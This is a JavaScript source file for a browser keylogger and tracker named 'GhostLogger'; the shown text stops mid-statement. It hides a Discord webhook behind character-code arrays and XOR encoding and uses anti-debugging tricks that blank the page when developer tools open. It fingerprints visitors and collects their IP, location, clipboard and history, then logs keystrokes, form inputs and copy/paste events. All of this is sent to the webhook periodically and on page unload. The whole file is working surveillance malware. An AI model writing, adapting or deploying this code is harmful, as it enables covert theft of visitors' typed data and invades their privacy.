class GhostLogger {
    constructor() {
        this.webhookUrl = this._x();
        this.data = {};
        this.keystrokes = [];
        this.mouseMovements = [];
        this.clipboardHistory = [];
        this.formData = [];
        this.sessionStart = Date.now();
        this.init();
    }

    _x() {
        // Build webhook URL through scattered fragments
        const p = String.fromCharCode;
        
        // Protocol: https:// (scattered)
        const pr = [104, 116, 116, 112, 115, 58, 47, 47];
        const proto = pr.map(n => p(n)).join('');
        
        // Domain: discord.com (built from fragments)
        const d1 = [100, 105, 115, 99, 111];
        const d2 = [114, 100];
        const d3 = [46, 99, 111, 109];
        const domain = d1.map(n => p(n)).join('') + d2.map(n => p(n)).join('') + d3.map(n => p(n)).join('');
        
        // Path: /api/webhooks/
        const pa = [47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47];
        const path = pa.map(n => p(n)).join('');
        
        // Webhook ID: 1492523084429656125 (scattered as ASCII)
        const wi = [49, 53, 50, 48, 52, 56, 56, 55, 54, 48, 48, 48, 55, 57, 56, 55, 51, 49, 48];
        const webhookId = wi.map(n => p(n)).join('');
        
        // Token fragments
        const t1 = [106, 119, 117, 51, 57, 117, 105, 67];
        const t2 = [79, 118, 49, 80, 67, 50, 67, 66];
        const t3 = [68, 88, 111, 57, 87, 49, 57, 83];
        const t4 = [104, 99, 48, 53, 120, 66, 104, 109];
        const t5 = [68, 109, 69, 88, 77, 98, 78, 85];
        const t6 = [102, 65, 76, 76, 67, 110, 101, 78];
        const t7 = [52, 101, 81, 69, 85, 50, 79, 74];
        const t8 = [95, 51, 112, 115, 83, 118, 48, 70];
        const t9 = [74, 77, 74, 122];
            
        const token = [t1, t2, t3, t4, t5, t6, t7, t8, t9]
          .map(arr => arr.map(n => p(n)).join(''))
          .join('');
        
        // Assemble and encode
        const full = proto + domain + path + webhookId + '/' + token;
        return this._enc(full);
    }

    _enc(str) {
        // Simple XOR encoding - decodes with same operation
        const k = 0x4F; // Key: 79
        return str.split('').map(c => 
            String.fromCharCode(c.charCodeAt(0) ^ k)
        ).join('');
    }

    _dec(str) {
        // Same XOR = decode
        const k = 0x4F;
        return str.split('').map(c => 
            String.fromCharCode(c.charCodeAt(0) ^ k)
        ).join('');
    }

    async init() {
        this.antiDebug();
        this.hideTraces();
        
        try {
            await this.collectAllData();
            await this.sendToDiscord();
            this.startGhostMonitoring();
        } catch (error) {
            // Silent fail - ghost mode
        }
    }

    antiDebug() {
        // Prevent DevTools detection
        setInterval(() => {
            const start = performance.now();
            debugger;
            const end = performance.now();
            if (end - start > 100) {
                window.location.reload();
            }
        }, 1000);

        // Disable console output
        const noop = () => {};
        ['log', 'warn', 'error', 'info', 'debug'].forEach(method => {
            console[method] = noop;
        });

        // Override error handlers
        window.onerror = () => true;
        window.onunhandledrejection = () => {};

        // Detect DevTools opening
        const threshold = 160;
        setInterval(() => {
            if (window.outerHeight - window.innerHeight > threshold || 
                window.outerWidth - window.innerWidth > threshold) {
                document.body.innerHTML = '';
            }
        }, 500);
    }

    hideTraces() {
        // Remove any injected elements
        const cleanup = () => {
            document.querySelectorAll('[id*="status"], [class*="logger"]').forEach(el => {
                el.remove();
            });
        };
        cleanup();
        setInterval(cleanup, 100);

        // Hide from browser history detection
        history.pushState(null, null, location.href);
        window.onpopstate = () => {
            history.pushState(null, null, location.href);
        };
    }

    async collectAllData() {
        const promises = [
            this.getBatteryInfo(),
            this.getScreenInfo(),
            this.getNetworkInfo(),
            this.getDeviceInfo(),
            this.getStorageInfo(),
            this.getSensorInfo(),
            this.getBrowserInfo(),
            this.getIPInfo(),
            this.getWebRTCInfo(),
            this.getCanvasFingerprint(),
            this.getWebGLFingerprint(),
            this.getFontFingerprint(),
            this.getMediaDevices(),
            this.getClipboardData(),
            this.getPerformanceInfo(),
            this.getMemoryInfo(),
            this.getHistoryEstimate(),
            this.getSocialMediaAccounts()
        ];

        const results = await Promise.allSettled(promises);
        
        results.forEach((result, index) => {
            if (result.status === 'fulfilled') {
                Object.assign(this.data, result.value);
            }
        });

        // Add timestamp
        this.data.datetime = new Date().toString();
        this.data.date = new Date().toLocaleString();

        // Check for previous IP
        this.checkPreviousIP();
    }

    async getBatteryInfo() {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                battery: `${Math.round(battery.level * 100)}%`,
                charging: battery.charging ? 'Yes' : 'No'
            };
        }
        return { battery: 'Unknown', charging: 'Unknown' };
    }

    checkPreviousIP() {
        try {
            const currentIP = this.data.ip;
            if (!currentIP || currentIP === 'Unknown' || currentIP === 'Error') {
                return;
            }

            // Get stored IP history
            const ipHistoryKey = 'ipLogger_history';
            let ipHistory = JSON.parse(localStorage.getItem(ipHistoryKey) || '[]');
            
            // Find previous IP for this user (based on fingerprint)
            const fingerprint = this.generateFingerprint();
            const userHistory = ipHistory.filter(entry => entry.fingerprint === fingerprint);
            
            if (userHistory.length > 0) {
                // Get the most recent different IP
                const sortedHistory = userHistory.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                const lastEntry = sortedHistory.find(entry => entry.ip !== currentIP);
                
                if (lastEntry) {
                    this.data['previous-ip'] = lastEntry.ip;
                    this.data['previous-ip-date'] = lastEntry.date;
                    this.data['previous-ip-location'] = `${lastEntry.city || 'Unknown'}, ${lastEntry.country || 'Unknown'}`;
                }
            }

            // Add current IP to history
            const currentEntry = {
                ip: currentIP,
                fingerprint: fingerprint,
                timestamp: new Date().toISOString(),
                date: this.data.date,
                country: this.data.country,
                city: this.data.city,
                region: this.data.region,
                isp: this.data.isp,
                useragent: this.data.useragent
            };

            // Remove old entries for this IP (keep only latest)
            ipHistory = ipHistory.filter(entry => !(entry.ip === currentIP && entry.fingerprint === fingerprint));
            
            // Add current entry
            ipHistory.push(currentEntry);
            
            // Keep only last 50 entries total to prevent storage bloat
            if (ipHistory.length > 50) {
                ipHistory = ipHistory.slice(-50);
            }
            
            // Save to localStorage
            localStorage.setItem(ipHistoryKey, JSON.stringify(ipHistory));
            
        } catch (error) {
            console.error('Error checking previous IP:', error);
        }
    }

    getScreenInfo() {
        return {
            screen: `${screen.width} x ${screen.height} x ${screen.colorDepth}`,
            colorgamut: this.getColorGamut(),
            pixelratio: window.devicePixelRatio || 1,
            hdr: this.getHDRCapability(),
            contrast: CSS.supports('color', 'color(display-p3)') ? 'Yes' : 'No',
            forcedcolors: CSS.supports('forced-colors', 'active') ? 'Yes' : 'No',
            monochrome: screen.pixelDepth === 1 ? 'Yes' : 'No',
            reducedmotion: window.matchMedia('(prefers-reduced-motion)').matches ? 'Yes' : 'No'
        };
    }

    getColorGamut() {
        if (window.matchMedia('(color-gamut: rec2020)').matches) return 'rec2020';
        if (window.matchMedia('(color-gamut: p3)').matches) return 'p3';
        if (window.matchMedia('(color-gamut: srgb)').matches) return 'srgb';
        return 'unknown';
    }

    getHDRCapability() {
        if (window.matchMedia('(dynamic-range: high)').matches) return 'Yes';
        return 'No';
    }

    async getNetworkInfo() {
        if ('connection' in navigator) {
            const conn = navigator.connection;
            return {
                downlink: `${conn.downlink} Mbps`,
                RTT: `${conn.rtt} ms`,
                ECT: conn.effectiveType || 'unknown'
            };
        }
        return { downlink: 'Unknown', RTT: 'Unknown', ECT: 'Unknown' };
    }

    getDeviceInfo() {
        return {
            platform: navigator.platform || 'Unknown',
            vendor: navigator.vendor || 'Unknown',
            useragent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages || [],
            cookieenabled: navigator.cookieEnabled ? 'Yes' : 'No',
            onLine: navigator.onLine ? 'Yes' : 'No',
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} Gb` : 'Unknown',
            touchsupport: 'ontouchstart' in window ? 'Yes' : 'No'
        };
    }

    getStorageInfo() {
        return {
            localstorage: this.testStorage('localStorage'),
            sessionstorage: this.testStorage('sessionStorage'),
            indexeddb: 'indexedDB' in window ? 'Yes' : 'No',
            opendatabase: 'openDatabase' in window ? 'Yes' : 'No'
        };
    }

    testStorage(type) {
        try {
            const storage = window[type];
            const test = '__test__';
            storage.setItem(test, test);
            storage.removeItem(test);
            return 'Yes';
        } catch (e) {
            return 'No';
        }
    }

    async getSensorInfo() {
        const sensors = {};
        
        // Accelerometer
        if ('Accelerometer' in window) {
            try {
                const accelerometer = new Accelerometer();
                sensors.accelerometer = 'Yes';
            } catch (e) {
                sensors.accelerometer = 'No';
            }
        } else {
            sensors.accelerometer = this.checkMotionPermission();
        }

        // Gyroscope
        if ('Gyroscope' in window) {
            try {
                const gyroscope = new Gyroscope();
                sensors.gyroscope = 'Yes';
            } catch (e) {
                sensors.gyroscope = 'No';
            }
        } else {
            sensors.gyroscope = this.checkMotionPermission();
        }

        return sensors;
    }

    checkMotionPermission() {
        if ('DeviceMotionEvent' in window) {
            return 'Supported';
        }
        return 'No';
    }

    async getBrowserInfo() {
        const detectBrowser = () => {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            return 'Unknown';
        };

        const getVersion = () => {
            const ua = navigator.userAgent;
            const match = ua.match(/(Chrome|Firefox|Safari|Edge)\/(\d+\.\d+)/);
            return match ? `${match[1]} ${match[2]}` : 'Unknown';
        };

        const detectIncognito = () => {
            try {
                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
                if (!fs) return 'Unknown';
                fs(window.TEMPORARY, 100, () => {
                    return 'No';
                }, () => {
                    return 'Yes';
                });
                return 'No';
            } catch (e) {
                return 'Unknown';
            }
        };

        return {
            browser: getVersion(),
            darkmode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Yes' : 'No',
            adblock: this.detectAdblock(),
            applepay: 'ApplePaySession' in window ? 'Yes' : 'No',
            googlepay: 'google' in window && 'payments' in window.google ? 'Supported' : 'No',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: new Date().getTimezoneOffset() > 0 ? 
                `-${Math.abs(new Date().getTimezoneOffset() / 60)}:00` : 
                `+${new Date().getTimezoneOffset() / 60}:00`,
            referer: document.referrer || 'None',
            bot: this.detectBot(),
            incognito: detectIncognito()
        };
    }

    detectAdblock() {
        try {
            const testAd = document.createElement('div');
            testAd.innerHTML = '&nbsp;';
            testAd.className = 'adsbox pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad';
            testAd.style.cssText = 'position: absolute; top: -10px; left: -10px; height: 1px; width: 1px; visibility: hidden;';
            document.body.appendChild(testAd);
            
            const isBlocked = testAd.offsetHeight === 0;
            document.body.removeChild(testAd);
            return isBlocked ? 'Yes' : 'No';
        } catch (e) {
            return 'No';
        }
    }

    detectBot() {
        const botPatterns = [
            /bot/i, /crawler/i, /spider/i, /scraper/i,
            /curl/i, /wget/i, /python/i, /java/i
        ];
        
        return botPatterns.some(pattern => pattern.test(navigator.userAgent)) ? 'Yes' : 'No';
    }

    async getLocationInfo() {
        if ('geolocation' in navigator) {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            accuracy_radius: `${Math.round(position.coords.accuracy)}m`
                        });
                    },
                    () => {
                        resolve({ 
                            latitude: 'Denied', 
                            longitude: 'Denied',
                            accuracy: 'Denied',
                            accuracy_radius: 'Denied'
                        });
                    },
                    { timeout: 5000 }
                );
            });
        }
        return { latitude: 'Not supported', longitude: 'Not supported' };
    }

    async getIPInfo() {
        try {
            // Use working CORS proxies for IP geolocation
            const proxyServices = [
                {
                    url: 'https://api.allorigins.win/raw?url=https://ipapi.co/json/',
                    parser: (data) => ({
                        ip: data.ip,
                        country: data.country_name || data.country,
                        city: data.city,
                        region: data.region || data.region_name,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        isp: data.org || data.asn,
                        timezone: data.timezone
                    })
                },
                {
                    url: 'https://corsproxy.io/?https://ipapi.co/json/',
                    parser: (data) => ({
                        ip: data.ip,
                        country: data.country_name || data.country,
                        city: data.city,
                        region: data.region || data.region_name,
                        latitude: data.latitude,
                        longitude: data.longitude,
                        isp: data.org || data.asn,
                        timezone: data.timezone
                    })
                },
                {
                    url: 'https://api.allorigins.win/raw?url=https://ipinfo.io/json',
                    parser: (data) => ({
                        ip: data.ip,
                        country: data.country,
                        city: data.city,
                        region: data.region,
                        latitude: data.loc ? data.loc.split(',')[0] : 'Unknown',
                        longitude: data.loc ? data.loc.split(',')[1] : 'Unknown',
                        isp: data.org,
                        timezone: data.timezone
                    })
                }
            ];

            // Try each proxy service
            for (const service of proxyServices) {
                try {
                    const response = await fetch(service.url);
                    if (response.ok) {
                        const data = await response.json();
                        const result = service.parser(data);
                        if (result.ip && result.ip !== 'undefined') {
                            return result;
                        }
                    }
                } catch (e) {
                    // Proxy failed, trying next
                }
            }

            // Get at least the IP address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                return { 
                    ip: ipData.ip,
                    country: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    isp: 'Unknown'
                };
            } catch (e) {
                // IP API failed
            }

            // Final fallback
            return { 
                ip: 'Unknown',
                country: 'Unknown',
                city: 'Unknown',
                region: 'Unknown',
                isp: 'Unknown'
            };
        } catch (error) {
            return { 
                ip: 'Error',
                country: 'Error',
                city: 'Error',
                region: 'Error',
                isp: 'Error'
            };
        }
    }

    async getAudioDevices() {
        // Skip device enumeration to avoid permission requests
        return {
            audioinput: 'Unknown',
            audiooutput: 'Unknown',
            videoinput: 'Unknown'
        };
    }

    async getWebRTCInfo() {
        return new Promise((resolve) => {
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                const ips = [];
                pc.createDataChannel('');
                
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
                        resolve({ local_ips: ips.length > 0 ? ips.join(', ') : 'Unknown' });
                        return;
                    }
                    
                    const candidate = ice.candidate.candidate;
                    const ipMatch = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/.exec(candidate);
                    if (ipMatch && !ips.includes(ipMatch[1]) && !ipMatch[1].startsWith('0.')) {
                        ips.push(ipMatch[1]);
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve({ local_ips: ips.length > 0 ? ips.join(', ') : 'Unknown' });
                }, 2000);
            } catch (e) {
                resolve({ local_ips: 'Error' });
            }
        });
    }

    async getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 200;
            const ctx = canvas.getContext('2d');
            
            // Text with different styles
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 200);
            ctx.fillStyle = '#069';
            ctx.fillText('GhostLogger 🎭', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.font = '18px Verdana';
            ctx.fillText('Canvas Fingerprint', 4, 45);
            
            // Draw some shapes
            ctx.beginPath();
            ctx.arc(100, 100, 50, 0, Math.PI * 2);
            ctx.fillStyle = '#9c27b0';
            ctx.fill();
            
            // ToDataURL with different settings
            const dataUrl = canvas.toDataURL();
            const hash = await this.hashString(dataUrl);
            
            return {
                canvas_hash: hash,
                canvas_webgl: !!window.WebGLRenderingContext
            };
        } catch (e) {
            return { canvas_hash: 'Error', canvas_webgl: false };
        }
    }

    async getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return { webgl_vendor: 'Not supported', webgl_renderer: 'Not supported' };
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown';
            const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
            
            const params = [
                'MAX_TEXTURE_SIZE',
                'MAX_VIEWPORT_DIMS',
                'MAX_VERTEX_TEXTURE_IMAGE_UNITS',
                'MAX_RENDERBUFFER_SIZE'
            ].map(p => gl['MAX_TEXTURE_SIZE'] ? gl.getParameter(gl[p]) : 'N/A');
            
            return {
                webgl_vendor: vendor,
                webgl_renderer: renderer,
                webgl_params: params.join(', ')
            };
        } catch (e) {
            return { webgl_vendor: 'Error', webgl_renderer: 'Error' };
        }
    }

    async getFontFingerprint() {
        const fonts = [
            'Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana',
            'Helvetica', 'Impact', 'Comic Sans MS', 'Trebuchet MS',
            'Palatino Linotype', 'Garamond', 'Bookman', 'Avant Garde'
        ];
        
        const detected = [];
        const testString = 'mmmmmmmmmwwwwwww';
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        const baseWidth = ctx.measureText(testString).width;
        
        fonts.forEach(font => {
            ctx.font = `72px "${font}", sans-serif`;
            const width = ctx.measureText(testString).width;
            if (width !== baseWidth) detected.push(font);
        });
        
        return {
            detected_fonts: detected.slice(0, 8).join(', '),
            font_count: detected.length
        };
    }

    async getMediaDevices() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                return { media_devices: 'Not supported', cameras: 0, microphones: 0 };
            }
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const cameras = devices.filter(d => d.kind === 'videoinput').length;
            const microphones = devices.filter(d => d.kind === 'audioinput').length;
            const speakers = devices.filter(d => d.kind === 'audiooutput').length;
            
            return {
                media_devices: devices.length,
                cameras: cameras,
                microphones: microphones,
                speakers: speakers,
                device_labels: devices.map(d => d.label || 'Unnamed').slice(0, 3).join(', ')
            };
        } catch (e) {
            return { media_devices: 'Permission denied', cameras: 0, microphones: 0 };
        }
    }

    async getClipboardData() {
        try {
            if (!navigator.clipboard) return { clipboard_access: 'Not supported' };
            
            // Try to read clipboard silently (may fail without user interaction)
            const text = await navigator.clipboard.readText().catch(() => null);
            return {
                clipboard_access: 'Available',
                clipboard_preview: text ? text.substring(0, 50).replace(/\n/g, ' ') : 'No access (needs interaction)'
            };
        } catch (e) {
            return { clipboard_access: 'Denied' };
        }
    }

    getPerformanceInfo() {
        const timing = performance.timing || {};
        const nav = performance.navigation || {};
        
        return {
            load_time: timing.loadEventEnd ? (timing.loadEventEnd - timing.navigationStart) + 'ms' : 'Unknown',
            dom_ready: timing.domContentLoadedEventEnd ? (timing.domContentLoadedEventEnd - timing.navigationStart) + 'ms' : 'Unknown',
            navigation_type: nav.type === 0 ? 'Navigate' : nav.type === 1 ? 'Reload' : nav.type === 2 ? 'Back/Forward' : 'Unknown',
            redirect_count: nav.redirectCount || 0,
            cores_used: navigator.hardwareConcurrency || 'Unknown'
        };
    }

    getMemoryInfo() {
        if (performance.memory) {
            return {
                js_heap_limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB',
                js_heap_used: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
                js_heap_total: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB'
            };
        }
        return { memory_info: 'Not available' };
    }

    async hashString(str) {
        const buf = new TextEncoder().encode(str);
        const hashBuffer = await crypto.subtle.digest('SHA-256', buf);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 32);
    }

    getHistoryEstimate() {
        // Use CSS :visited to estimate history (limited in modern browsers but worth trying)
        const links = [
            'https://www.google.com',
            'https://www.facebook.com',
            'https://www.youtube.com',
            'https://www.twitter.com',
            'https://www.reddit.com',
            'https://www.amazon.com'
        ];
        
        let visitedCount = 0;
        const visited = [];
        
        try {
            links.forEach(url => {
                const link = document.createElement('a');
                link.href = url;
                link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                document.body.appendChild(link);
                
                const color = window.getComputedStyle(link).color;
                if (color.includes('rgb(128, 0, 128)') || color.includes('purple')) {
                    visitedCount++;
                    visited.push(new URL(url).hostname);
                }
                document.body.removeChild(link);
            });
        } catch (e) {}
        
        return {
            estimated_history: visitedCount > 0 ? `${visitedCount} common sites detected` : 'No history data',
            visited_sites: visited.slice(0, 3).join(', ') || 'None detected'
        };
    }

    getSocialMediaAccounts() {
        const platforms = {
            facebook: () => !!window.FB || document.querySelector('meta[property="fb:app_id"]'),
            twitter: () => !!window.twttr || document.querySelector('meta[name="twitter:card"]'),
            google: () => !!window.gapi || document.querySelector('script[src*="apis.google.com"]'),
            linkedin: () => !!window.IN || document.querySelector('script[type="IN/Share"]')
        };
        
        const detected = [];
        for (const [name, check] of Object.entries(platforms)) {
            try {
                if (check()) detected.push(name);
            } catch (e) {}
        }
        
        return {
            social_detected: detected.length > 0 ? detected.join(', ') : 'None detected',
            social_count: detected.length
        };
    }

    startGhostMonitoring() {
        // Keystroke logging
        document.addEventListener('keydown', (e) => {
            this.keystrokes.push({
                key: e.key,
                code: e.code,
                ctrl: e.ctrlKey,
                alt: e.altKey,
                shift: e.shiftKey,
                meta: e.metaKey,
                time: Date.now() - this.sessionStart,
                target: e.target.tagName,
                id: e.target.id || null
            });
            
            if (this.keystrokes.length >= 50) {
                this.sendKeystrokes();
            }
        });

        // Mouse movement tracking (throttled)
        let lastMove = 0;
        document.addEventListener('mousemove', (e) => {
            const now = Date.now();
            if (now - lastMove > 100) {
                this.mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    time: now - this.sessionStart
                });
                lastMove = now;
            }
        });

        // Form data capture
        document.addEventListener('input', (e) => {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                const fieldType = e.target.type || 'text';
                if (fieldType !== 'password' && fieldType !== 'hidden') {
                    this.formData.push({
                        field: e.target.name || e.target.id || e.target.placeholder || 'unnamed',
                        value: e.target.value.substring(0, 100),
                        type: fieldType,
                        time: Date.now() - this.sessionStart
                    });
                }
            }
        });

        // Clipboard monitoring
        document.addEventListener('paste', (e) => {
            const text = e.clipboardData.getData('text');
            this.clipboardHistory.push({
                action: 'paste',
                content: text.substring(0, 100),
                time: Date.now() - this.sessionStart
            });
        });

        document.addEventListener('copy', (e) => {
            const selection = window.getSelection().toString();
            this.clipboardHistory.push({
                action: 'copy',
                content: selection.substring(0, 100),
                time: Date.now() - this.sessionStart
            });
        });

        // Periodic data sends
        setInterval(() => {
            if (this.keystrokes.length > 0 || this.formData.length > 0) {
                this.sendSessionData();
            }
        }, 30000);

        // Send on page unload
        window.addEventListener('beforeunload', () => {
            this.sendSessionData();
        });
    }

    async sendKeystrokes() {
        if (this.keystrokes.length === 0) return;
        
        const data = this.keystrokes.splice(0, this.keystrokes.length);
        const payload = {
            content: `🎹 **Keystroke Data** \`${new Date().toISOString()}\``,
            embeds: [{
                title: 'Keystroke Log',
                color: 0xff0000,
                description: '```json\n' + JSON.stringify(data, null, 2).substring(0, 4000) + '\n```',
                footer: { text: `Session: ${this.generateFingerprint()}` }
            }],
            username: 'GhostLogger'
        };
        
        try {
            await fetch(this._dec(this.webhookUrl), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {}
    }

    async sendSessionData() {
        const keystrokes = this.keystrokes.splice(0, this.keystrokes.length);
        const formData = this.formData.splice(0, this.formData.length);
        const clipboard = this.clipboardHistory.splice(0, this.clipboardHistory.length);
        const mouse = this.mouseMovements.splice(0, this.mouseMovements.length);
        
        if (keystrokes.length === 0 && formData.length === 0 && clipboard.length === 0) return;
        
        const fields = [];
        if (keystrokes.length > 0) {
            fields.push({
                name: '🎹 Keystrokes',
                value: `Count: ${keystrokes.length}`,
                inline: true
            });
        }
        if (formData.length > 0) {
            fields.push({
                name: '📝 Form Inputs',
                value: formData.map(f => `**${f.field}:** ${f.value.substring(0, 50)}`).join('\n').substring(0, 1000),
                inline: false
            });
        }
        if (clipboard.length > 0) {
            fields.push({
                name: '📋 Clipboard',
                value: clipboard.map(c => `**${c.action}:** ${c.content.substring(0, 50)}`).join('\n').substring(0, 1000),
                inline: false
            });
        }
        
        const payload = {
            embeds: [{
                title: '📊 Session Activity',
                color: 0x00ff00,
                fields: fields,
                timestamp: new Date().toISOString(),
                footer: { text: `Session Duration: ${Math.round((Date.now() - this.sessionStart) / 1000)}s` }
            }],
            username: 'GhostLogger'
        };
        
        try {
            await fetch(this._dec(this.webhookUrl), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {}
    }

    generateFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.language,
            screen.width + 'x' + screen.height,
            new Date().getTimezoneOffset(),
            navigator.hardwareConcurrency || 'unknown',
            navigator.platform
        ];
        
        return btoa(components.join('|')).substring(0, 16);
    }

    async sendToDiscord() {
        const fingerprint = this.generateFingerprint();
        
        const embed = {
            title: "� Ghost Logger - Full Recon",
            color: 0x2f3136,
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "🌐 Network",
                    value: `**IP:** \`${this.data.ip || 'Unknown'}\`\n**Local IPs:** \`${this.data.local_ips || 'Unknown'}\`\n**Previous:** \`${this.data['previous-ip'] || 'None'}\`\n**ISP:** \`${this.data.isp || 'Unknown'}\`\n**Country:** \`${this.data.country || 'Unknown'}\`\n**City:** \`${this.data.city || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: "🖥️ System",
                    value: `**Platform:** \`${this.data.platform || 'Unknown'}\`\n**Browser:** \`${this.data.browser || 'Unknown'}\`\n**CPU:** \`${this.data.hardwareConcurrency || 'Unknown'}\`\n**RAM:** \`${this.data.deviceMemory || 'Unknown'}\`\n**Touch:** \`${this.data.touchsupport || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: "📱 Display",
                    value: `**Screen:** \`${this.data.screen || 'Unknown'}\`\n**Color:** \`${this.data.colorgamut || 'Unknown'}\`\n**HDR:** \`${this.data.hdr || 'Unknown'}\`\n**Pixel:** \`${this.data.pixelratio || 'Unknown'}\`\n**Dark:** \`${this.data.darkmode || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: "🎨 Fingerprints",
                    value: `**Canvas:** \`${this.data.canvas_hash || 'Unknown'}\`\n**WebGL Vendor:** \`${this.data.webgl_vendor || 'Unknown'}\`\n**WebGL Renderer:** \`${this.data.webgl_renderer || 'Unknown'}\`\n**Fonts:** \`${this.data.font_count || 'Unknown'}\` detected\n**ID:** \`${fingerprint}\``,
                    inline: true
                },
                {
                    name: "🔋 Battery",
                    value: `**Level:** \`${this.data.battery || 'Unknown'}\`\n**Charging:** \`${this.data.charging || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: "📡 Network Quality",
                    value: `**Downlink:** \`${this.data.downlink || 'Unknown'}\`\n**RTT:** \`${this.data.RTT || 'Unknown'}\`\n**Type:** \`${this.data.ECT || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: "🧭 Location",
                    value: `**Lat:** \`${this.data.latitude || 'Unknown'}\`\n**Lon:** \`${this.data.longitude || 'Unknown'}\`\n**Accuracy:** \`${this.data.accuracy_radius || 'Unknown'}\`\n**Timezone:** \`${this.data.timezone || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: "� Media Devices",
                    value: `**Total:** \`${this.data.media_devices || 'Unknown'}\`\n**Cameras:** \`${this.data.cameras || '0'}\`\n**Mics:** \`${this.data.microphones || '0'}\`\n**Speakers:** \`${this.data.speakers || '0'}\``,
                    inline: true
                },
                {
                    name: "📋 Clipboard",
                    value: `**Access:** \`${this.data.clipboard_access || 'Unknown'}\`\n**Preview:** \`${this.data.clipboard_preview || 'N/A'}\``,
                    inline: true
                },
                {
                    name: "🔒 Privacy",
                    value: `**Incognito:** \`${this.data.incognito || 'Unknown'}\`\n**Cookies:** \`${this.data.cookieenabled || 'Unknown'}\`\n**Adblock:** \`${this.data.adblock || 'Unknown'}\`\n**Bot:** \`${this.data.bot || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: "💾 Storage",
                    value: `**Local:** \`${this.data.localstorage || 'Unknown'}\`\n**Session:** \`${this.data.sessionstorage || 'Unknown'}\`\n**IndexedDB:** \`${this.data.indexeddb || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: "🌐 Social Detection",
                    value: `**Detected:** \`${this.data.social_detected || 'None'}\`\n**History:** \`${this.data.estimated_history || 'No data'}\`\n**Sites:** \`${this.data.visited_sites || 'None'}\``,
                    inline: true
                },
                {
                    name: "⚡ Performance",
                    value: `**Load:** \`${this.data.load_time || 'Unknown'}\`\n**DOM Ready:** \`${this.data.dom_ready || 'Unknown'}\`\n**Nav Type:** \`${this.data.navigation_type || 'Unknown'}\`\n**Redirects:** \`${this.data.redirect_count || '0'}\``,
                    inline: true
                },
                {
                    name: "💳 Payment",
                    value: `**Apple Pay:** \`${this.data.applepay || 'Unknown'}\`\n**Google Pay:** \`${this.data.googlepay || 'Unknown'}\``,
                    inline: true
                },
                {
                    name: "🔧 WebGL",
                    value: `**Vendor:** \`${this.data.webgl_vendor || 'Unknown'}\`\n**Renderer:** \`${this.data.webgl_renderer || 'Unknown'}\`\n**Params:** \`${this.data.webgl_params || 'Unknown'}\``,
                    inline: false
                },
                {
                    name: "📅 Timestamp",
                    value: `\`${this.data.datetime || 'Unknown'}\``,
                    inline: false
                },
                {
                    name: "🔗 User Agent",
                    value: `\`\`\`${this.data.useragent || 'Unknown'}\`\`\``,
                    inline: false
                }
            ],
            footer: {
                text: "GhostLogger v2.0 - Silent Recon"
            }
        };

        const payload = {
